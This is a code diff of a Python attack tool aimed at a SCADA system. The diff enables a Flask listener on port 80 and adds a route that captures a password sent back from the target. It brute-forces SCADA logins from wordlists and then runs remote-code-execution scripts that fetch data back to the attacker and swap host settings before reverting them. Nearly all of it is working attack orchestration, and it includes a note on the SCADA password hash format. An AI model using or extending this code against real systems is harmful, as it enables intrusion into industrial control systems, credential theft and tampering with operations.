@@ -6,11 +6,14 @@ from RCE import RCE
 from utils import *
 
 this_ip = get_ip_address('eth0')
-this_port = 80
-substitute_in_file('scripts/fetch_ip_ditto.sh', (this_ip, this_port))
+substitute_in_file('scripts/fetch_ip_ditto.sh', {'this_ip': this_ip})
+substitute_in_file('scripts/substitute_host.sh', {'this_ip': this_ip})
 
 ip_ditto = None
 last_data_ditto = {}
+
+credientials_scada = []
+password_ditto = None
 
 scanner = nmap.PortScanner()
 scada_url = ''
@@ -24,7 +27,6 @@ for host in scanner.all_hosts():
             break
 print(f"Found Scada URL: ", scada_url)
 
-rce = RCE(scada_url, 'test', 'test', this_ip, this_port)
 app = Flask(__name__)
 
 @app.route('/get_script/<string:name>')
@@ -39,8 +41,21 @@ def route_ip_ditto():
     ip_ditto = str(request.get_data().decode())
     print("IP DITTO FRONTEND: "+ip_ditto, flush=True)
     
-    substitute_in_file('scripts/fetch_data_ditto.sh', (ip_ditto, this_ip, this_port))
-    substitute_in_file('scripts/substitute_host.sh', (this_ip,))
+    substitute_in_file('scripts/fetch_data_ditto.sh', 
+        {'ip_ditto': ip_ditto, 
+        'this_ip': this_ip})
+    substitute_in_file('scripts/check_credential_ditto.sh', 
+    {'ip_ditto': ip_ditto,
+    'this_ip': this_ip})
+
+    return "Stored"
+
+@app.route('/credential_ditto/<string:password>', methods=["POST"])
+def route_credential_ditto(password):
+    global password_ditto
+    if str(request.get_data().decode()) == '{':
+        password_ditto = password
+        print("Found password: ", password_ditto, flush=True)
 
     return "Stored"
 
@@ -59,19 +74,26 @@ def route_simulation(thing_id):
 
 if __name__ == "__main__":
     ### WEBSERVER
-    if False:
-        webserverThread = threading.Thread(target=app.run, args=('0.0.0.0', this_port))
+    if True:
+        webserverThread = threading.Thread(target=app.run, args=('0.0.0.0', 80))
         webserverThread.start()
 
-    ### RCE
-    if False:
-        rce.execute_script('fetch_ip_ditto.sh')
-        rce.execute_script('fetch_data_ditto.sh')
-        rce.execute_script('substitute_host.sh')
-        time.sleep(120)
-        rce.execute_script('revert_host.sh')  
+    credientials_scada = bruteforce_password_scada(scada_url, 'wordlist/usernames.txt', 'wordlist/passwords.txt')   
+    while len(credientials_scada) == 0:
+        time.sleep(10)
+    rce = RCE(scada_url, credientials_scada[1][0], credientials_scada[1][1], this_ip)
+    rce.execute_script('fetch_ip_ditto.sh')
+    bruteforce_password_ditto(scada_url, rce, 'wordlist/passwords.txt')
+    print("End bruteforce ditto", flush=True)
+    print(password_ditto, flush=True)
+    while password_ditto is None:
+        time.sleep(10)
+    print("Substituting", flush=True)
+    substitute_in_file('scripts/fetch_data_ditto.sh', {'password_ditto': password_ditto})
+    rce.execute_script('fetch_data_ditto.sh')
+    rce.execute_script('substitute_host.sh')
+    time.sleep(120)
+    rce.execute_script('revert_host.sh')     
 
-    print(bruteforce_password_scada(scada_url, 'wordlist/usernames.txt', 'wordlist/passwords.txt'))    
-    
     # Possible Hash per password Scada DB
     # Base64(unhex(SHA-1($plaintext)))
